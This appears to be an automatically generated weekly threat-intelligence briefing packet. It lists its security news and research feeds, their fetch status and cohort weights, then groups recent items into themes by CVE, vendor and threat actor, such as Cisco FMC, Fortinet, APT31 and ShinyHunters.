# PHANTOMSignal Briefing Packet

- Generated: 2026-09-10T14:13:30.623611+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 75
- Total items in window: 404
- Total clusters raw: 209
- Total clusters in packet: 80
- Dropped low score: 128
- Dropped overflow: 1

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 2
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 3
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 9
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 5
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 0
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 5
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 4
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 3
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 14
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 2
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 0
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 20
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 18
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 100
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 26
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 13
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 1

## Affinity groups (themes)

### CVE-2026-85880 exploitation activity
- Anchor signal: CVE-2026-85880
- Theme key: cve-2026-85880
- Cluster count: 7
- Article count: 7
- Cohesion: 0.307
- Shared strong signals: CVE-2026-85880
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, active_exploitation, phishing_social_eng
  - actor_attribution: APT31
  - affected_industries: government
  - cve_ids: CVE-2026-85880, CVE-2026-81963, CVE-2026-85046, CVE-2026-87491
  - urgency_signals: zero_day, actively_exploited
- Cluster IDs: a8443c14f2, a7d235c86e, 9097ac899e, 62136c6613, 44179b1aeb, f08ee4366d, 26a67e9e74
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
  - https://thehackernews.com/2026/09/microsoft-patches-record-974-flaws.html
  - https://cyberscoop.com/microsoft-patch-tuesday-september-2026/
  - https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
  - https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/

### Cisco exploitation (CVE-2026-20079)
- Anchor signal: Cisco
- Theme key: cisco
- Cluster count: 6
- Article count: 9
- Cohesion: 0.255
- Shared strong signals: Cisco
- Member CVEs: CVE-2026-20079
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_industries: government
  - affected_products: Cisco
  - cve_ids: CVE-2026-20079, CVE-2026-20316
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: ebddae999f, 5786bd6a86, 5c29932a73, f08ee4366d, 93c6fb73a4, 6d3c34c28d
- Links:
  - https://www.bleepingcomputer.com/news/security/cisco-confirms-cve-2026-20079-secure-fmc-flaw-exploited-in-attacks/
  - https://www.helpnetsecurity.com/2026/09/10/cisco-fmc-exploited-cve-2026-20079-cve-2026-20316/
  - https://www.securityweek.com/organizations-warned-of-cisco-secure-fmc-exploitation/
  - https://thehackernews.com/2026/09/cisa-flags-exploited-cisco-citrix.html
  - https://blog.talosintelligence.com/fmc-ongoing-exploitation/
  - https://www.recordedfuture.com/blog/august-2026-cve-landscape
  - https://blog.talosintelligence.com/microsoft-patch-tuesday-for-september-2026/
  - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
  - https://www.bleepingcomputer.com/news/security/over-36-000-plex-servers-unpatched-against-recently-disclosed-flaws/

### Fortinet active exploitation
- Anchor signal: Fortinet
- Theme key: fortinet
- Cluster count: 4
- Article count: 9
- Cohesion: 0.297
- Shared strong signals: Fortinet
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, data_breach, active_exploitation
  - affected_industries: government, manufacturing_industrial
  - affected_products: Fortinet, Android, Ivanti
  - urgency_signals: zero_day, actively_exploited, preauth_unauth
- Cluster IDs: ebddae999f, d3ed2ddfb7, 1a949c8352, b7da86183f
- Links:
  - https://www.bleepingcomputer.com/news/security/cisco-confirms-cve-2026-20079-secure-fmc-flaw-exploited-in-attacks/
  - https://www.helpnetsecurity.com/2026/09/10/cisco-fmc-exploited-cve-2026-20079-cve-2026-20316/
  - https://www.securityweek.com/organizations-warned-of-cisco-secure-fmc-exploitation/
  - https://thehackernews.com/2026/09/cisa-flags-exploited-cisco-citrix.html
  - https://www.securityweek.com/critical-netscaler-vulnerability-exploited-in-attacks/
  - https://www.securityweek.com/fortinet-code-execution-flaw-exploited-in-pivotc2-rat-attacks/
  - https://www.team-cymru.com/post/ai-driven-threat-detection-is-reshaping-cybersecurity
  - https://www.securityweek.com/4-1-million-impacted-by-adapthealth-data-breach/

### CVE-2026-87491 exploitation activity
- Anchor signal: CVE-2026-87491
- Theme key: cve-2026-87491
- Cluster count: 4
- Article count: 4
- Cohesion: 0.479
- Shared strong signals: CVE-2026-87491
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, web_shell_backdoor, phishing_social_eng, active_exploitation, apt_espionage
  - actor_attribution: APT31
  - affected_industries: government, education
  - cve_ids: CVE-2026-87491, CVE-2026-85046, CVE-2026-85880
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: aa9e62a68c, 62136c6613, 44179b1aeb, 26a67e9e74
- Links:
  - https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
  - https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/

### zero day targeting APT31
- Anchor signal: APT31
- Theme key: apt31
- Cluster count: 4
- Article count: 7
- Cohesion: 0.439
- Shared strong signals: APT31
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, apt_espionage, phishing_social_eng, web_shell_backdoor
  - actor_attribution: APT31
  - affected_industries: government
  - cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
  - urgency_signals: zero_day, no_patch_yet
- Cluster IDs: 7c42269e48, 62136c6613, 44179b1aeb, 26a67e9e74
- Links:
  - https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
  - https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/
  - https://www.helpnetsecurity.com/2026/09/10/microsoft-365-social-engineering-personal-phones/
  - https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://www.bleepingcomputer.com/news/security/new-bluemoon-kit-exploited-windows-and-chrome-zero-day-flaws/

### AWS active exploitation
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 4
- Article count: 6
- Cohesion: 0.229
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, credential_theft, supply_chain, zero_day, web_shell_backdoor
  - affected_industries: education
  - affected_products: AWS, OpenAI/ChatGPT
  - urgency_signals: actively_exploited, preauth_unauth, no_patch_yet, zero_day
- Cluster IDs: 462fbf5ade, aa9e62a68c, d67c59e989, 9d718427a9
- Links:
  - https://www.wiz.io/blog/off-guard-breaking-litellm-from-authentication-bypass-to-cloud-compromise
  - https://thehackernews.com/2026/09/chrome-v8-zero-day-exploited-in-wild.html
  - https://thehackernews.com/2026/09/attackers-exploit-papercut-flaws-to.html
  - https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
  - https://aws.amazon.com/blogs/security/incident-response-guide-for-aws-cloudtrail-investigations-part-2/

### CVE-2026-86206 exploitation activity
- Anchor signal: CVE-2026-86206
- Theme key: cve-2026-86206
- Cluster count: 3
- Article count: 4
- Cohesion: 0.348
- Shared strong signals: CVE-2026-86206
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: 2a281139fe, dca90fcb42, 711e127637
- Links:
  - https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
  - https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - https://www.huntress.com/blog/n-able-vulnerability-exploitation

### CVE-2026-86207 exploitation activity
- Anchor signal: CVE-2026-86207
- Theme key: cve-2026-86207
- Cluster count: 3
- Article count: 4
- Cohesion: 0.348
- Shared strong signals: CVE-2026-86207
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: 2a281139fe, dca90fcb42, 711e127637
- Links:
  - https://www.rapid7.com/blog/post/ve-cve-2026-86206-cve-2026-86207-n-able-n-central-authentication-bypass-fixed
  - https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - https://www.huntress.com/blog/n-able-vulnerability-exploitation

### Cl0p: ransomware extortion
- Anchor signal: Cl0p
- Theme key: cl0p
- Cluster count: 4
- Article count: 4
- Cohesion: 0.554
- Shared strong signals: Cl0p
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, apt_espionage
  - actor_attribution: Cl0p, ShinyHunters
  - affected_industries: manufacturing_industrial
- Cluster IDs: 498d32f5a8, 0be1df44fd, 88364fe6d8, fb556ca51b
- Links:
  - https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
  - https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence

### CVE-2026-86218 exploitation activity
- Anchor signal: CVE-2026-86218
- Theme key: cve-2026-86218
- Cluster count: 3
- Article count: 4
- Cohesion: 0.398
- Shared strong signals: CVE-2026-86218
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, zero_day
  - cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
  - urgency_signals: actively_exploited, preauth_unauth, zero_day, poc_available
- Cluster IDs: dca90fcb42, 81949698a6, 711e127637
- Links:
  - https://thehackernews.com/2026/09/n-able-n-central-pre-auth-rce-flaw.html
  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
  - https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
  - https://www.huntress.com/blog/n-able-vulnerability-exploitation

### ShinyHunters: ransomware extortion
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 4
- Article count: 6
- Cohesion: 0.457
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, apt_espionage
  - actor_attribution: ShinyHunters, Cl0p
  - affected_industries: manufacturing_industrial
- Cluster IDs: d8c893e316, 498d32f5a8, 0be1df44fd, 88364fe6d8
- Links:
  - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - https://www.bleepingcomputer.com/news/security/adapthealth-confirms-41-million-people-exposed-in-july-cyberattack/
  - https://www.darkreading.com/cybersecurity-operations/what-we-missed-did-shinyhunters-breach-reliaquest
  - https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
  - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january

### zero day targeting Microsoft Windows
- Anchor signal: Microsoft Windows
- Theme key: microsoft-windows
- Cluster count: 3
- Article count: 3
- Cohesion: 0.266
- Shared strong signals: Microsoft Windows
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: zero_day, ransomware_extortion
  - affected_products: Microsoft Windows
  - cve_ids: CVE-2026-85046, CVE-2026-85880
  - urgency_signals: zero_day
- Cluster IDs: a8443c14f2, 44179b1aeb, 22339b9409
- Links:
  - https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
  - https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/

## Forward signals

### Novelty
- Novel cves: 2
  - CVE-2026-85102 (first seen via The Hacker News at 2026-09-10T11:45:05+00:00, cluster bb1e989af8)
  - CVE-2026-85103 (first seen via The Hacker News at 2026-09-10T11:45:05+00:00, cluster bb1e989af8)
- Novel actors: 0
- Novel products: 0

### Velocity bursts (1)
- **Cisco confirms CVE-2026-20079 Secure FMC flaw exploited in attacks**
  - Cluster: ebddae999f
  - Sources in window: 3
  - Window hours: 1.3
  - Cohort count: 1

### Leading edge (0)

### Convergence (15)
- Pair: CVE-2026-81963 + Microsoft Windows (cluster a8443c14f2, first observation: True)
- Pair: CVE-2026-85046 + Microsoft Windows (cluster a8443c14f2, first observation: True)
- Pair: CVE-2026-85880 + Microsoft Windows (cluster a8443c14f2, first observation: True)
- Pair: CVE-2026-20079 + Fortinet (cluster ebddae999f, first observation: True)
- Pair: CVE-2026-20316 + Fortinet (cluster ebddae999f, first observation: True)
- Pair: CVE-2026-19490 + Android (cluster d3ed2ddfb7, first observation: True)
- Pair: CVE-2026-19490 + Fortinet (cluster d3ed2ddfb7, first observation: True)
- Pair: CVE-2026-19490 + Ivanti (cluster d3ed2ddfb7, first observation: True)
- Pair: CVE-2022-23176 + Citrix (cluster 66a3633edb, first observation: True)
- Pair: CVE-2022-23176 + Microsoft SharePoint (cluster 66a3633edb, first observation: True)
- Pair: CVE-2025-14733 + Citrix (cluster 66a3633edb, first observation: True)
- Pair: CVE-2025-14733 + Microsoft SharePoint (cluster 66a3633edb, first observation: True)
- Pair: CVE-2025-9242 + Citrix (cluster 66a3633edb, first observation: True)
- Pair: CVE-2025-9242 + Microsoft SharePoint (cluster 66a3633edb, first observation: True)
- Pair: CVE-2026-59821 + AWS (cluster 462fbf5ade, first observation: True)

### Drift (4)
- **APT27** (cluster 7c42269e48)
  - New industries: (none)
  - New products: Microsoft 365
  - Prior top industries: (none)
  - Prior top products: GitHub, Microsoft SharePoint
- **APT31** (cluster 7c42269e48)
  - New industries: (none)
  - New products: Microsoft 365
  - Prior top industries: education, financial_services, government
  - Prior top products: GitHub, Microsoft SharePoint, Microsoft Windows
- **ShinyHunters** (cluster d8c893e316)
  - New industries: (none)
  - New products: Microsoft SharePoint
  - Prior top industries: financial_services, healthcare, manufacturing_industrial
  - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce
- **UNC6240** (cluster d8c893e316)
  - New industries: healthcare
  - New products: (none)
  - Prior top industries: education, financial_services, telecommunications
  - Prior top products: AWS, Microsoft SharePoint, Salesforce

### Persistence (15)
- actor_attribution: ShinyHunters (weeks observed: 14, cluster d8c893e316)
- actor_attribution: Scattered Spider (weeks observed: 11, cluster fc5c9992d3)
- actor_attribution: Cl0p (weeks observed: 7, cluster 498d32f5a8)
- actor_attribution: LockBit (weeks observed: 7, cluster 439827e1a6)
- cve_ids: CVE-2026-18577 (weeks observed: 5, cluster 2a281139fe)
- cve_ids: CVE-2026-20316 (weeks observed: 4, cluster ebddae999f)
- cve_ids: CVE-2026-19490 (weeks observed: 4, cluster d3ed2ddfb7)
- actor_attribution: Kimsuky (weeks observed: 4, cluster 93a2320bbc)
- actor_attribution: Rhysida (weeks observed: 4, cluster b579a537a6)
- actor_attribution: UNC6240 (weeks observed: 3, cluster d8c893e316)
- actor_attribution: UNC6661 (weeks observed: 3, cluster d8c893e316)
- cve_ids: CVE-2026-63077 (weeks observed: 3, cluster 9d718427a9)
- actor_attribution: Volt Typhoon (weeks observed: 3, cluster b9771fe2d2)
- cve_ids: CVE-2026-32475 (weeks observed: 3, cluster 9ebfca707c)
- cve_ids: CVE-2026-72898 (weeks observed: 3, cluster 5c29932a73)

### Tier inversion (0)

## Clusters

### Cluster a8443c14f2 — score 36

- Title: Patch Tuesday - September 2026
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-08T21:44:04+00:00
- Link: https://www.rapid7.com/blog/post/em-patch-tuesday-september-2026
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-81963, CVE-2026-85046, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_products: Microsoft Windows
